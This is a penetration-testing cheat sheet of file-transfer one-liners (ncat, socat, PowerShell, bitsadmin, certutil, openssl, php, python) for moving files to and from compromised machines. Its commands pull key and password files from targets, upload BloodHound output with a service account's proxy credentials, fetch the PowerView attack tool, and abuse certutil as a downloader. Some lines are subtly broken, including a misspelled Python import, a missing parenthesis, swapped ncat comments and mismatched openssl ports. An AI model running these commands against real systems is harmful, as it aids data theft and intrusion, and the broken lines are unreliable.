# File-Transfers

***ncat***

```shell
nc -nv 192.168.1.129 4444 > file_to_send.txt # the file we will transfer 

nc -lnvp 4444 < file_to_send.txt # download file on the target machine 

```

***socat***

```shell

socat TCP4-LISTEN:1337,fork file:~/home/mastermind/key.txt # the file we will send 

socat - TCP4:192.168.1.129:1337 # download the file 

```

***powershell***

```powershell

New-Object System.Net.WebClient).DownloadFile('http://192.168.1.122:8080/file_to_download.txt',"C:\Users\Public\Downloads\file_to_download.txt")

```

```powershell

Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

```
***bitsadmin***

```powershell

bitsadmin /transfer n http://192.168.1.123/password.txt C:\User\Mastermind\password.txt # download the file

```

```powershell
# Download 
Import-Module bitstransfer;Start-BitsTransfer -Source "http://192.168.1.123/password.txt" -Destination C:\User\Mastermind\password.txt" 

```
```powershell
#upload 

Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql

```
***Certutil***

```
certutil.exe -verifyctl -split -f http://192.168.1.1/file.txt

```

***openssl***

```shell
# create the cert

openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# set up a server 

openssl s_server -quiet -accept 8081 -cert certificate.pem -key key.pem < /file_to_download.txt

# Download the file on target machine 

openssl s_client -connect 127.0.0.1:8080 -quiet > file_to_download.txt
```

***php***

```shell
php -r '$file = file_get_contents("http://10.10.10.12:8080/file_to_download.txt"); file_put_contents("file_to_download.txt",$file);'
```

***python***

```python 
import urlib.request

urllib.request.urlretrieve("http://10.10.10.12:8080/file_to_download.txt", "file_to_download.txt")

```







